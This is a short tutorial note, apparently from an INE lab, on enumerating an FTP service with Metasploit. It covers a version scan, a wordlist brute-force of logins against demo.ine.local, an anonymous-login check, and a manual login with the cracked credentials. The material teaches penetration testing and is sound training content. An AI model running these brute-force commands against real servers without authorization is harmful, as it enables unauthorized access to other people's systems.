
# FTP Enumeration using Metasploit

This note explains how to enumerate FTP services using Metasploit modules.

## Step 1: Start msfconsole

```bash
msfconsole
```

## Step 2: Check FTP service version

Use the `ftp_version` scanner to detect the FTP server version.

```bash
use auxiliary/scanner/ftp/ftp_version
set RHOSTS demo.ine.local
run
```

📌 **Result example:** The server is running `ProFTPD 1.3.5a`

---

## Step 3: Brute-force FTP login

We use `ftp_login` to try to guess credentials.

```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

📌 **Example result:** Found credentials: `sysadmin:654321`

---

## Step 4: Check for anonymous login

```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS demo.ine.local
run
```

📌 If anonymous login is **not allowed**, you'll see: `Login failed`.

---

## Step 5: Login via FTP manually

Now that we have valid credentials, login to the FTP server:

```bash
ftp demo.ine.local
```

Then enter:

- Username: `sysadmin`
- Password: `654321`

You should be logged in and able to use commands like `ls`, `get`, etc.

---

## Summary

- We scanned the FTP service for version info.
- Performed a brute-force to get credentials.
- Checked for anonymous login.
- Logged in manually using found credentials.
